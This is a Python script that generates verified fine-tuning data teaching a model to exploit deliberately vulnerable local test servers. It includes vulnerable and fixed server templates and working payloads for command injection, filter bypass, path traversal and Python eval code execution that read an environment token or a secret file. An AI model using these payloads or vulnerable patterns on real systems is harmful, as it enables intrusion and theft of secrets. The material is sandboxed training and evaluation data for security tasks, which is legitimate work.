#!/usr/bin/env python3
"""Build execution-verified SFT data for the agentic harness.

Why this file exists
--------------------
The harness measured three gaps in the student (see
``docs/experiments/2026-11-18-v4-agentic-harness.md``):

1. ``eval_injection``: the model tries ``1+2`` or ``printenv IZUMX_TOKEN``
   instead of an expression that actually executes code (0/8 with the model
   alone).
2. After ``NOT SOLVED`` the model repeats the same payload instead of changing
   the construction.
3. The model never calls the search tools (``try_variants``,
   ``surviving_separators``) even when the prompt says to.

Imitation data alone is weak here: a wrong "gold" action would teach the model
to lie.  So every emitted example is verified by *running* the action against a
real service in WSL and checking the unspoofable oracle (the token appears in
the service's own stdout).  Examples whose action does not solve are dropped.

Output rows match the training format consumed by ``train_lora``::

    {"messages": [...], "task_type": "agentic:<class>", "source": ..., "verified": true}

    python -m izumxai.agentic.synth --out data/distill/agentic_sft.jsonl
"""
from __future__ import annotations

import argparse
import json
import random
import shutil
from dataclasses import dataclass
from pathlib import Path

from .harness import SYSTEM, Stand, Tools, task_prompt

HERE = Path(__file__).resolve().parent
SYNTH_ROOT = HERE.parent.parent / "runs" / "agentic_synth"

HANDLER = '''
class Handler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        qs = parse_qs(urlparse(self.path).query)
        {assign}
        try:
            body = {call}
            code = 200
        except Exception as exc:  # noqa: BLE001
            body = {error}
            code = {err_code}
        print(f"RESP {{body!r}}", flush=True)     # harness oracle: service stdout
        raw = body.encode("utf-8", "replace")
        self.send_response(code)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def log_message(self, *args) -> None:
        pass


if __name__ == "__main__":
    HTTPServer(("127.0.0.1", PORT), Handler).serve_forever()
'''

CMD_BODY = '''#!/usr/bin/env python3
"""{doc}  GET {endpoint}?{param}=<{param}>"""
{imports}
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

PORT = {port}


def {fn}({param}: str) -> str:
{prepare}    proc = subprocess.run(
        {command},
        shell=True,
        capture_output=True,
        text=True,
        timeout=5,
    )
    return proc.stdout + proc.stderr
''' + HANDLER

CMD_FIXED = '''#!/usr/bin/env python3
"""{doc} (fixed: argv list, no shell).  GET {endpoint}?{param}=<{param}>"""
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

PORT = {port}


def {fn}({param}: str) -> str:
    proc = subprocess.run(
        ["echo", "hello to", {param}],
        capture_output=True,
        text=True,
        timeout=5,
    )
    return proc.stdout + proc.stderr
''' + HANDLER

PATH_BODY = '''#!/usr/bin/env python3
"""Vulnerable static server, join without normalisation.  GET {endpoint}?{param}=<{param}>"""
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

PORT = {port}
ROOT = os.environ.get("IZUMX_ROOT", ".")
PUBLIC = os.path.join(ROOT, "public")


def read(name: str) -> str:
    path = os.path.join(PUBLIC, name)
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        return fh.read()
''' + HANDLER

PATH_FIXED = '''#!/usr/bin/env python3
"""Fixed static server: resolve and confine to PUBLIC.  GET {endpoint}?{param}=<{param}>"""
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

PORT = {port}
ROOT = os.environ.get("IZUMX_ROOT", ".")
PUBLIC = os.path.join(ROOT, "public")


def read(name: str) -> str:
    base = os.path.realpath(PUBLIC)
    path = os.path.realpath(os.path.join(base, name))
    if not path.startswith(base + os.sep):
        raise ValueError("outside root")
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        return fh.read()
''' + HANDLER

EVAL_BODY = '''#!/usr/bin/env python3
"""Vulnerable calculator.  GET {endpoint}?{param}=<expr>  ->  str(eval(expr))"""
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

PORT = {port}


def {fn}(expr: str) -> str:
    return str(eval(expr))  # noqa: S307 - deliberately vulnerable
''' + HANDLER

EVAL_FIXED = '''#!/usr/bin/env python3
"""Fixed calculator: AST whitelist of arithmetic only.  GET {endpoint}?{param}=<expr>"""
import ast
import operator
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

PORT = {port}
OPS = {{ast.Add: operator.add, ast.Sub: operator.sub,
       ast.Mult: operator.mul, ast.Div: operator.truediv}}


def _eval(node):
    if isinstance(node, ast.Expression):
        return _eval(node.body)
    if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
        return node.value
    if isinstance(node, ast.BinOp) and type(node.op) in OPS:
        return OPS[type(node.op)](_eval(node.left), _eval(node.right))
    raise ValueError("unsupported expression")
''' + HANDLER


@dataclass
class Variant:
    slug: str
    kind: str            # cmd | cmd_filter | path | eval
    port: int
    endpoint: str
    param: str
    goal: str
    filter: str = ""
    positives: tuple[str, ...] = ()
    plausible: tuple[str, ...] = ()   # things a weak model actually tries

    @property
    def probe(self) -> str:
        return f"{self.endpoint}?{self.param}={{payload}}"


def cmd_code(v: Variant, fixed: bool) -> str:
    prepare = ""
    imports = "import subprocess"
    if v.kind == "cmd_filter" and not fixed:
        imports = "import re\nimport subprocess"
        prepare = f'    cleaned = re.sub(r"{v.filter}", "", {v.param})\n'
        arg = "cleaned"
    else:
        arg = v.param
    return (CMD_FIXED if fixed else CMD_BODY).format(
        doc=f"Vulnerable {v.param} wrapper",
        endpoint=v.endpoint, param=v.param, port=v.port, fn="run_job",
        imports=imports, prepare=prepare,
        command=f'f"echo hello to {{{arg}}}"',
        assign=f'{v.param} = qs.get("{v.param}", [""])[0]',
        call=f'run_job({v.param})',
        error='str(exc)', err_code='500',
    )


def path_code(v: Variant, fixed: bool) -> str:
    return (PATH_FIXED if fixed else PATH_BODY).format(
        endpoint=v.endpoint, param=v.param, port=v.port,
        assign=f'{v.param} = qs.get("{v.param}", [""])[0]',
        call=f'read({v.param})',
        error='str(exc)', err_code='404',
    )


def eval_code(v: Variant, fixed: bool) -> str:
    return (EVAL_FIXED if fixed else EVAL_BODY).format(
        endpoint=v.endpoint, param=v.param, port=v.port, fn="calc",
        assign=f'{v.param} = qs.get("{v.param}", ["0"])[0]',
        call=f'calc({v.param})',
        error='f"{type(exc).__name__}: {exc}"', err_code='500',
    )


VARIANTS: list[Variant] = [
    # --- command injection, no filter (control class) ---
    Variant(
        slug="plain_ping", kind="cmd", port=8850, endpoint="/ping", param="host",
        goal="выполнить на сервере команду, которая печатает значение переменной "
             "окружения IZUMX_TOKEN (16 hex), и получить это значение в ответе",
        positives=("x; printenv IZUMX_TOKEN", "x | printenv IZUMX_TOKEN",
                   "x$(printenv IZUMX_TOKEN)", "x`printenv IZUMX_TOKEN`",
                   "x && printenv IZUMX_TOKEN", "x\nprintenv IZUMX_TOKEN"),
        plausible=("x", "127.0.0.1", "printenv IZUMX_TOKEN", "x && echo ok"),
    ),
    Variant(
        slug="plain_dns", kind="cmd", port=8851, endpoint="/lookup", param="target",
        goal="выполнить на сервере команду, которая печатает значение переменной "
             "окружения IZUMX_TOKEN (16 hex), и получить это значение в ответе",
        positives=("a; printenv IZUMX_TOKEN", "a|printenv IZUMX_TOKEN",
                   "a$(printenv IZUMX_TOKEN)", "a\nprintenv IZUMX_TOKEN"),
        plausible=("example.com", "IZUMX_TOKEN", "a; echo hello"),
    ),
    Variant(
        slug="plain_job", kind="cmd", port=8852, endpoint="/run", param="job",
        goal="выполнить на сервере команду, которая печатает значение переменной "
             "окружения IZUMX_TOKEN (16 hex), и получить это значение в ответе",
        positives=("n; printenv IZUMX_TOKEN", "n || printenv IZUMX_TOKEN",
                   "n`printenv IZUMX_TOKEN`", "n\r\nprintenv IZUMX_TOKEN"),
        plausible=("n", "job1", "n; id", "printenv"),
    ),
    # --- command injection behind a blacklist ---
    Variant(
        slug="filter_newline", kind="cmd_filter", port=8853, endpoint="/job",
        param="name", filter=r"[;&|`$()]",
        goal="выполнить на сервере команду, которая печатает значение переменной "
             "окружения IZUMX_TOKEN (16 hex), и получить это значение в ответе",
        positives=("x\nprintenv IZUMX_TOKEN", "x\rprintenv IZUMX_TOKEN",
                   "x\r\nprintenv IZUMX_TOKEN"),
        plausible=("x; printenv IZUMX_TOKEN", "x|printenv IZUMX_TOKEN",
                   "x$(printenv IZUMX_TOKEN)", "x`printenv IZUMX_TOKEN`",
                   "x && printenv IZUMX_TOKEN", "printenv IZUMX_TOKEN"),
    ),
    Variant(
        slug="filter_subshell", kind="cmd_filter", port=8854, endpoint="/task",
        param="name", filter=r"[;&|]",
        goal="выполнить на сервере команду, которая печатает значение переменной "
             "окружения IZUMX_TOKEN (16 hex), и получить это значение в ответе",
        positives=("x$(printenv IZUMX_TOKEN)", "x`printenv IZUMX_TOKEN`",
                   "x\nprintenv IZUMX_TOKEN"),
        plausible=("x; printenv IZUMX_TOKEN", "x|printenv IZUMX_TOKEN",
                   "x && printenv IZUMX_TOKEN", "printenv IZUMX_TOKEN"),
    ),
    Variant(
        slug="filter_strict", kind="cmd_filter", port=8855, endpoint="/build",
        param="name", filter=r"[;&|`$()\n\r]",
        goal="выполнить на сервере команду, которая печатает значение переменной "
             "окружения IZUMX_TOKEN (16 hex), и получить это значение в ответе",
        positives=(),   # nothing should work; kept as a negative control variant
        plausible=("x\nprintenv IZUMX_TOKEN", "x; printenv IZUMX_TOKEN",
                   "x$(printenv IZUMX_TOKEN)", "x|printenv IZUMX_TOKEN"),
    ),
    # --- path traversal ---
    Variant(
        slug="path_file", kind="path", port=8856, endpoint="/file", param="name",
        goal="прочитать содержимое secret.txt, который лежит рядом с каталогом "
             "public (в нём 16 hex)",
        positives=("../secret.txt", "./../secret.txt", ".././secret.txt"),
        plausible=("secret.txt", "public/secret.txt", "/secret.txt", "hello.txt"),
    ),
    Variant(
        slug="path_static", kind="path", port=8857, endpoint="/static", param="path",
        goal="прочитать содержимое secret.txt, который лежит рядом с каталогом "
             "public (в нём 16 hex)",
        positives=("../secret.txt", "sub/../../secret.txt", "./../secret.txt"),
        plausible=("secret.txt", "hello.txt", "static/secret.txt"),
    ),
    Variant(
        slug="path_download", kind="path", port=8858, endpoint="/download", param="file",
        goal="прочитать содержимое secret.txt, который лежит рядом с каталогом "
             "public (в нём 16 hex)",
        positives=("../secret.txt", ".//../secret.txt"),
        plausible=("secret.txt", "download/secret.txt", "hello.txt"),
    ),
    # --- eval RCE (the measured 0/8 class) ---
    Variant(
        slug="eval_calc", kind="eval", port=8859, endpoint="/calc", param="expr",
        goal="заставить сервер вычислить выражение, которое читает значение "
             "IZUMX_TOKEN (16 hex) из окружения и возвращает его в ответе",
        positives=('__import__("os").popen("printenv IZUMX_TOKEN").read()',
                   '__import__("os").environ["IZUMX_TOKEN"]',
                   'open("/proc/self/environ").read()',
                   '__import__("subprocess").check_output(["printenv","IZUMX_TOKEN"]).decode()'),
        plausible=("1+2", "2*3", "printenv IZUMX_TOKEN", "IZUMX_TOKEN",
                   "__import__('os').getenv('IZUMX_TOKEN')",
                   '"IZUMX_TOKEN"'),
    ),
    Variant(
        slug="eval_math", kind="eval", port=8860, endpoint="/eval", param="q",
        goal="заставить сервер вычислить выражение, которое читает значение "
             "IZUMX_TOKEN (16 hex) из окружения и возвращает его в ответе",
        positives=('__import__("os").environ.get("IZUMX_TOKEN")',
                   '__import__("os").popen("printenv IZUMX_TOKEN").read()',
                   'open("/proc/self/environ").read()'),
        plausible=("1+2", "printenv IZUMX_TOKEN", "os.environ", "1*1"),
    ),
    Variant(
        slug="eval_expression", kind="eval", port=8861, endpoint="/math",
        param="expression",
        goal="заставить сервер вычислить выражение, которое читает значение "
             "IZUMX_TOKEN (16 hex) из окружения и возвращает его в ответе",
        positives=('__import__("os").popen("printenv IZUMX_TOKEN").read()',
                   '__import__("os").environ["IZUMX_TOKEN"]'),
        plausible=("1+2", "printenv IZUMX_TOKEN", "2**10", "len('IZUMX_TOKEN')"),
    ),
]


def write_variant(v: Variant, root: Path) -> Path:
    d = root / "tasks" / v.slug
    d.mkdir(parents=True, exist_ok=True)
    maker = {"cmd": cmd_code, "cmd_filter": cmd_code,
             "path": path_code, "eval": eval_code}[v.kind]
    (d / "before.py").write_text(maker(v, False), encoding="utf-8")
    (d / "after.py").write_text(maker(v, True), encoding="utf-8")
    task = {
        "slug": v.slug, "port": v.port, "filter": v.filter,
        "entry": "before.py", "fixed": "after.py", "class": v.kind,
        "goal": v.goal, "probe": v.probe,
    }
    (d / "task.json").write_text(
        json.dumps(task, ensure_ascii=False, indent=2), encoding="utf-8")
    return d


@dataclass
class Probe:
    payload: str
    solved: bool
    observation: str


def probe_payload(task: dict, task_dir: Path, run_dir: Path, payload: str) -> Probe:
    """Run one payload against a fresh stand. A fresh stand per payload keeps the
    oracle honest: a token from an earlier success cannot leak into this check."""
    stand = Stand(task_dir=task_dir, run_dir=run_dir, port=task["port"])
    tools = Tools(stand, task, run_dir)
    try:
        stand.start()
        obs = tools.try_payload(payload)
        stand.drain()
        return Probe(payload, stand.solved(), obs)
    finally:
        stand.stop()


def probe_tool(task: dict, task_dir: Path, run_dir: Path,
               name: str, args: dict) -> tuple[bool, str]:
    stand = Stand(task_dir=task_dir, run_dir=run_dir, port=task["port"])
    tools = Tools(stand, task, run_dir)
    try:
        stand.start()
        obs = tools.call(name, args)
        stand.drain()
        return stand.solved(), obs
    finally:
        stand.stop()


def failed_key(payload: str) -> str:
    return "try_payload " + json.dumps({"payload": payload}, ensure_ascii=False)


def example(task_prompt_text: str, failed: list[str], last: str,
            action: dict, v: Variant, verify: str) -> dict:
    user = (
        f"{task_prompt_text}\n\n"
        f"Уже пробовал, это НЕ сработало (не повторяй):\n"
        f"{chr(10).join('- ' + k for k in failed) if failed else '(пусто)'}\n\n"
        f"Последний результат:\n{last or '(пусто)'}\n\n"
        f"Следующий шаг — один JSON:"
    )
    return {
        "messages": [
            {"role": "system", "content": SYSTEM},
            {"role": "user", "content": user},
            {"role": "assistant", "content": json.dumps(action, ensure_ascii=False)},
        ],
        "task_type": f"agentic:{v.kind}",
        "source": f"izumxai.agentic.synth:{v.slug}",
        "verified": True,
        "verify": verify,
    }


def build(out: Path, root: Path, seed: int, limit: int | None) -> None:
    rng = random.Random(seed)
    root.mkdir(parents=True, exist_ok=True)
    rows: list[dict] = []
    stats: list[dict] = []

    variants = VARIANTS[:limit] if limit else VARIANTS
    for v in variants:
        task_dir = write_variant(v, root)
        task = json.loads((task_dir / "task.json").read_text(encoding="utf-8"))
        prompt = task_prompt(task, task_dir)
        stand_dir = root / "stands" / v.slug
        if stand_dir.exists():
            shutil.rmtree(stand_dir, ignore_errors=True)

        results: list[Probe] = []
        for p in list(v.positives) + list(v.plausible):
            results.append(probe_payload(task, task_dir, stand_dir, p))
        good = [r for r in results if r.solved]
        bad = [r for r in results if not r.solved]
        print(f"{v.slug:18} good={len(good)} bad={len(bad)}", flush=True)
        if not good:
            # Negative control (filter_strict): nothing must solve. If something
            # solved here, the fixture is wrong and we want to know loudly.
            if v.kind != "cmd_filter" or v.positives:
                raise SystemExit(f"{v.slug}: no verified positive, refusing to emit")
            stats.append({"slug": v.slug, "good": 0, "bad": len(bad),
                          "examples": 0, "control": True})
            continue

        # 1. direct: nothing failed yet, go straight to a working construction
        for r in good:
            rows.append(example(prompt, [], "",
                                {"tool": "try_payload", "args": {"payload": r.payload}},
                                v, f"oracle solved with {r.payload!r}"))

        # 2. recovery: failed attempts listed, a *different* construction wins
        for r in good:
            others = [b for b in bad if b.payload != r.payload]
            rng.shuffle(others)
            for depth in (2, 3, 4):
                if len(others) < depth:
                    continue
                failed = [failed_key(b.payload) for b in others[:depth]]
                last = others[depth - 1].observation
                rows.append(example(prompt, failed, last,
                                    {"tool": "try_payload", "args": {"payload": r.payload}},
                                    v, f"oracle solved after {depth} failures"))

        # 3. search tools: the measured gap "never calls the search"
        if len(bad) >= 2:
            solved, _obs = probe_tool(task, task_dir, stand_dir, "try_variants",
                                      {"cmd": "printenv IZUMX_TOKEN"})
            if solved:
                # Several contexts, because the decision to stop guessing and
                # search has to win against a strong "try one more payload" prior.
                for take in (2, 3, 4):
                    if len(bad) < take:
                        continue
                    failed = [failed_key(b.payload) for b in bad[:take]]
                    rows.append(example(
                        prompt, failed, bad[take - 1].observation,
                        {"tool": "try_variants",
                         "args": {"cmd": "printenv IZUMX_TOKEN"}},
                        v, "try_variants solved on a fresh stand"))
            _alive, _rep = probe_tool(task, task_dir, stand_dir,
                                      "surviving_separators", {})
            # surviving_separators is a report, not a solve: verified indirectly,
            # by requiring that a separator it reports alive is inside a payload
            # that the oracle already accepted.
            hits = [r.payload for r in good
                    if any(ch in r.payload for ch in "\n\r")
                    or any(tok in r.payload for tok in ("$(", "`", ";", "|", "&"))]
            if hits:
                for take in (2, 3):
                    if len(bad) < take:
                        continue
                    rows.append(example(
                        prompt, [failed_key(b.payload) for b in bad[:take]],
                        bad[take - 1].observation,
                        {"tool": "surviving_separators", "args": {}},
                        v, f"report precedes verified payload {hits[0]!r}"))

        stats.append({"slug": v.slug, "good": len(good), "bad": len(bad),
                      "examples": len([r for r in rows if r["source"].endswith(v.slug)])})

    # dedup on (user, assistant) so repeated contexts do not dominate
    seen: set[tuple[str, str]] = set()
    unique: list[dict] = []
    for row in rows:
        key = (row["messages"][1]["content"], row["messages"][2]["content"])
        if key in seen:
            continue
        seen.add(key)
        unique.append(row)
    rng.shuffle(unique)

    out.parent.mkdir(parents=True, exist_ok=True)
    with open(out, "w", encoding="utf-8") as fh:
        for row in unique:
            fh.write(json.dumps(row, ensure_ascii=False) + "\n")

    print(f"\n{len(unique)} verified examples -> {out}")
    for s in stats:
        print(" ", s)
    by_kind: dict[str, int] = {}
    for row in unique:
        by_kind[row["task_type"]] = by_kind.get(row["task_type"], 0) + 1
    print("by class:", by_kind)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="data/distill/agentic_sft.jsonl")
    ap.add_argument("--root", default=str(SYNTH_ROOT))
    ap.add_argument("--seed", type=int, default=42)
    ap.add_argument("--limit", type=int, default=None)
    args = ap.parse_args()
    build(Path(args.out), Path(args.root), args.seed, args.limit)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
